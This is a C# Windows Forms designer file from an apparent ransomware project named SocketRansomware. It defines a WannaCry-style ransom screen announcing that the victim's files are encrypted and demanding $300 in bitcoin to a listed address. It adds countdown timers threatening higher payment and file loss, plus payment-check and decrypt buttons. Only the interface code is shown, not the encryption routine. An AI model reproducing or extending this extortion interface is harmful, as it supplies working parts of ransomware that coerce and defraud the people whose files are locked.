
namespace SocketRansomware
{
    partial class Form1
    {
        /// <summary>
        /// 필수 디자이너 변수입니다.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// 사용 중인 모든 리소스를 정리합니다.
        /// </summary>
        /// <param name="disposing">관리되는 리소스를 삭제해야 하면 true이고, 그렇지 않으면 false입니다.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form 디자이너에서 생성한 코드

        /// <summary>
        /// 디자이너 지원에 필요한 메서드입니다. 
        /// 이 메서드의 내용을 코드 편집기로 수정하지 마세요.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label1 = new System.Windows.Forms.Label();
            this.cbboxLanguage = new System.Windows.Forms.ComboBox();
            this.listView2 = new System.Windows.Forms.ListView();
            this.addressLabel = new System.Windows.Forms.Label();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.tbKey = new System.Windows.Forms.TextBox();
            this.btnCopy = new System.Windows.Forms.Button();
            this.btnCheckPayment = new System.Windows.Forms.Button();
            this.btnDecrypt = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.lbtimer1 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.lbtimer2 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.lbDate1 = new System.Windows.Forms.Label();
            this.lbDate2 = new System.Windows.Forms.Label();
            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
            this.linkLabel2 = new System.Windows.Forms.LinkLabel();
            this.linkLabel3 = new System.Windows.Forms.LinkLabel();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.SuspendLayout();
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(85, 12);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(158, 148);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("나눔바른고딕", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.label1.ForeColor = System.Drawing.SystemColors.Control;
            this.label1.Location = new System.Drawing.Point(315, 12);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(498, 31);
            this.label1.TabIndex = 1;
            this.label1.Text = "Ooops, your files have been encrypted!";
            // 
            // cbboxLanguage
            // 
            this.cbboxLanguage.AccessibleRole = System.Windows.Forms.AccessibleRole.ComboBox;
            this.cbboxLanguage.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbboxLanguage.Font = new System.Drawing.Font("굴림", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.cbboxLanguage.FormattingEnabled = true;
            this.cbboxLanguage.Items.AddRange(new object[] {
            "English",
            "Korean",
            "Japan"});
            this.cbboxLanguage.Location = new System.Drawing.Point(875, 21);
            this.cbboxLanguage.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.cbboxLanguage.Name = "cbboxLanguage";
            this.cbboxLanguage.Size = new System.Drawing.Size(132, 24);
            this.cbboxLanguage.TabIndex = 2;
            // 
            // listView2
            // 
            this.listView2.ForeColor = System.Drawing.Color.Black;
            this.listView2.HideSelection = false;
            this.listView2.Location = new System.Drawing.Point(322, 68);
            this.listView2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.listView2.Name = "listView2";
            this.listView2.Size = new System.Drawing.Size(630, 343);
            this.listView2.TabIndex = 4;
            this.listView2.UseCompatibleStateImageBehavior = false;
            // 
            // addressLabel
            // 
            this.addressLabel.AutoSize = true;
            this.addressLabel.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
            this.addressLabel.Font = new System.Drawing.Font("굴림", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.addressLabel.ForeColor = System.Drawing.Color.Yellow;
            this.addressLabel.Location = new System.Drawing.Point(322, 446);
            this.addressLabel.Margin = new System.Windows.Forms.Padding(0);
            this.addressLabel.Name = "addressLabel";
            this.addressLabel.Padding = new System.Windows.Forms.Padding(149, 0, 116, 40);
            this.addressLabel.Size = new System.Drawing.Size(630, 58);
            this.addressLabel.TabIndex = 5;
            this.addressLabel.Text = "Send $300 worth of bitcoin to this address:";
            // 
            // pictureBox2
            // 
            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
            this.pictureBox2.Location = new System.Drawing.Point(324, 453);
            this.pictureBox2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(131, 40);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox2.TabIndex = 6;
            this.pictureBox2.TabStop = false;
            // 
            // tbKey
            // 
            this.tbKey.Location = new System.Drawing.Point(472, 473);
            this.tbKey.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.tbKey.Name = "tbKey";
            this.tbKey.ReadOnly = true;
            this.tbKey.Size = new System.Drawing.Size(394, 21);
            this.tbKey.TabIndex = 7;
            this.tbKey.Text = "3D7qetdNlKUqQHPJmcMDEHYoqkyNVsFk9r";
            // 
            // btnCopy
            // 
            this.btnCopy.Font = new System.Drawing.Font("굴림", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.btnCopy.Location = new System.Drawing.Point(892, 471);
            this.btnCopy.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.btnCopy.Name = "btnCopy";
            this.btnCopy.Size = new System.Drawing.Size(52, 20);
            this.btnCopy.TabIndex = 8;
            this.btnCopy.Text = "copy";
            this.btnCopy.UseVisualStyleBackColor = true;
            this.btnCopy.Click += new System.EventHandler(this.btnCopy_Click);
            // 
            // btnCheckPayment
            // 
            this.btnCheckPayment.Font = new System.Drawing.Font("굴림", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.btnCheckPayment.Location = new System.Drawing.Point(321, 536);
            this.btnCheckPayment.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.btnCheckPayment.Name = "btnCheckPayment";
            this.btnCheckPayment.Size = new System.Drawing.Size(284, 24);
            this.btnCheckPayment.TabIndex = 9;
            this.btnCheckPayment.Text = "Check Payment";
            this.btnCheckPayment.UseVisualStyleBackColor = true;
            this.btnCheckPayment.Click += new System.EventHandler(this.btnCheckPayment_Click);
            // 
            // btnDecrypt
            // 
            this.btnDecrypt.Font = new System.Drawing.Font("굴림", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.btnDecrypt.Location = new System.Drawing.Point(668, 536);
            this.btnDecrypt.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.btnDecrypt.Name = "btnDecrypt";
            this.btnDecrypt.Size = new System.Drawing.Size(284, 24);
            this.btnDecrypt.TabIndex = 10;
            this.btnDecrypt.Text = "Decrypt";
            this.btnDecrypt.UseVisualStyleBackColor = true;
            this.btnDecrypt.Click += new System.EventHandler(this.btnDecrypt_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
            this.label2.Cursor = System.Windows.Forms.Cursors.Default;
            this.label2.Font = new System.Drawing.Font("굴림", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.label2.ForeColor = System.Drawing.Color.Yellow;
            this.label2.Location = new System.Drawing.Point(19, 175);
            this.label2.Name = "label2";
            this.label2.Padding = new System.Windows.Forms.Padding(44, 0, 42, 120);
            this.label2.Size = new System.Drawing.Size(288, 136);
            this.label2.TabIndex = 11;
            this.label2.Text = "Payment will be raised on";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
            this.label3.Cursor = System.Windows.Forms.Cursors.Default;
            this.label3.Font = new System.Drawing.Font("굴림", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.label3.ForeColor = System.Drawing.Color.Yellow;
            this.label3.Location = new System.Drawing.Point(19, 335);
            this.label3.Name = "label3";
            this.label3.Padding = new System.Windows.Forms.Padding(49, 0, 48, 120);
            this.label3.Size = new System.Drawing.Size(288, 136);
            this.label3.TabIndex = 12;
            this.label3.Text = "Your files will be lost on";
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 1000;
            this.timer1.Tick += new System.EventHandler(this.count_down);
            // 
            // lbtimer1
            // 
            this.lbtimer1.AutoSize = true;
            this.lbtimer1.Font = new System.Drawing.Font("굴림", 22.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.lbtimer1.ForeColor = System.Drawing.Color.White;
            this.lbtimer1.Location = new System.Drawing.Point(96, 276);
            this.lbtimer1.Name = "lbtimer1";
            this.lbtimer1.Size = new System.Drawing.Size(135, 30);
            this.lbtimer1.TabIndex = 16;
            this.lbtimer1.Text = "00:00:00";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("굴림", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(122, 262);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(75, 14);
            this.label4.TabIndex = 17;
            this.label4.Text = "Time Left";
            // 
            // lbtimer2
            // 
            this.lbtimer2.AutoSize = true;
            this.lbtimer2.Font = new System.Drawing.Font("굴림", 22.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.lbtimer2.ForeColor = System.Drawing.Color.White;
            this.lbtimer2.Location = new System.Drawing.Point(96, 436);
            this.lbtimer2.Name = "lbtimer2";
            this.lbtimer2.Size = new System.Drawing.Size(135, 30);
            this.lbtimer2.TabIndex = 18;
            this.lbtimer2.Text = "00:00:00";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("굴림", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(122, 422);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(75, 14);
            this.label5.TabIndex = 19;
            this.label5.Text = "Time Left";
            // 
            // lbDate1
            // 
            this.lbDate1.AutoSize = true;
            this.lbDate1.Font = new System.Drawing.Font("굴림", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.lbDate1.ForeColor = System.Drawing.Color.White;
            this.lbDate1.Location = new System.Drawing.Point(88, 224);
            this.lbDate1.Name = "lbDate1";
            this.lbDate1.Size = new System.Drawing.Size(0, 14);
            this.lbDate1.TabIndex = 20;
            // 
            // lbDate2
            // 
            this.lbDate2.AutoSize = true;
            this.lbDate2.Font = new System.Drawing.Font("굴림", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.lbDate2.ForeColor = System.Drawing.Color.White;
            this.lbDate2.Location = new System.Drawing.Point(88, 384);
            this.lbDate2.Name = "lbDate2";
            this.lbDate2.Size = new System.Drawing.Size(0, 14);
            this.lbDate2.TabIndex = 21;
            // 
            // linkLabel1
            // 
            this.linkLabel1.AutoSize = true;
            this.linkLabel1.ForeColor = System.Drawing.Color.Cyan;
            this.linkLabel1.LinkColor = System.Drawing.Color.Cyan;
            this.linkLabel1.Location = new System.Drawing.Point(76, 494);
            this.linkLabel1.Name = "linkLabel1";
            this.linkLabel1.Size = new System.Drawing.Size(78, 12);
            this.linkLabel1.TabIndex = 22;
            this.linkLabel1.TabStop = true;
            this.linkLabel1.Text = "About bitcoin";
            this.linkLabel1.VisitedLinkColor = System.Drawing.Color.Cyan;
            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
            // 
            // linkLabel2
            // 
            this.linkLabel2.AutoSize = true;
            this.linkLabel2.ForeColor = System.Drawing.Color.Cyan;
            this.linkLabel2.LinkColor = System.Drawing.Color.Cyan;
            this.linkLabel2.Location = new System.Drawing.Point(76, 521);
            this.linkLabel2.Name = "linkLabel2";
            this.linkLabel2.Size = new System.Drawing.Size(123, 12);
            this.linkLabel2.TabIndex = 23;
            this.linkLabel2.TabStop = true;
            this.linkLabel2.Text = "How to buy bitcoins?";
            this.linkLabel2.VisitedLinkColor = System.Drawing.Color.Cyan;
            this.linkLabel2.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel2_LinkClicked);
            // 
            // linkLabel3
            // 
            this.linkLabel3.AutoSize = true;
            this.linkLabel3.ForeColor = System.Drawing.Color.Cyan;
            this.linkLabel3.LinkColor = System.Drawing.Color.Cyan;
            this.linkLabel3.Location = new System.Drawing.Point(76, 548);
            this.linkLabel3.Name = "linkLabel3";
            this.linkLabel3.Size = new System.Drawing.Size(66, 12);
            this.linkLabel3.TabIndex = 24;
            this.linkLabel3.TabStop = true;
            this.linkLabel3.Text = "Contact us";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(130)))), ((int)(((byte)(18)))), ((int)(((byte)(18)))));
            this.ClientSize = new System.Drawing.Size(1017, 602);
            this.Controls.Add(this.linkLabel3);
            this.Controls.Add(this.linkLabel2);
            this.Controls.Add(this.linkLabel1);
            this.Controls.Add(this.lbDate2);
            this.Controls.Add(this.lbDate1);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.lbtimer2);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.lbtimer1);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.btnDecrypt);
            this.Controls.Add(this.btnCheckPayment);
            this.Controls.Add(this.btnCopy);
            this.Controls.Add(this.tbKey);
            this.Controls.Add(this.pictureBox2);
            this.Controls.Add(this.addressLabel);
            this.Controls.Add(this.listView2);
            this.Controls.Add(this.cbboxLanguage);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.pictureBox1);
            this.Cursor = System.Windows.Forms.Cursors.Default;
            this.Name = "Form1";
            this.Text = "   ";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.ComboBox cbboxLanguage;
        private System.Windows.Forms.ListView listView2;
        private System.Windows.Forms.Label addressLabel;
        private System.Windows.Forms.PictureBox pictureBox2;
        private System.Windows.Forms.TextBox tbKey;
        private System.Windows.Forms.Button btnCopy;
        private System.Windows.Forms.Button btnCheckPayment;
        private System.Windows.Forms.Button btnDecrypt;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.Label lbtimer1;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label lbtimer2;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label lbDate1;
        private System.Windows.Forms.Label lbDate2;
        private System.Windows.Forms.LinkLabel linkLabel1;
        private System.Windows.Forms.LinkLabel linkLabel2;
        private System.Windows.Forms.LinkLabel linkLabel3;
    }
}

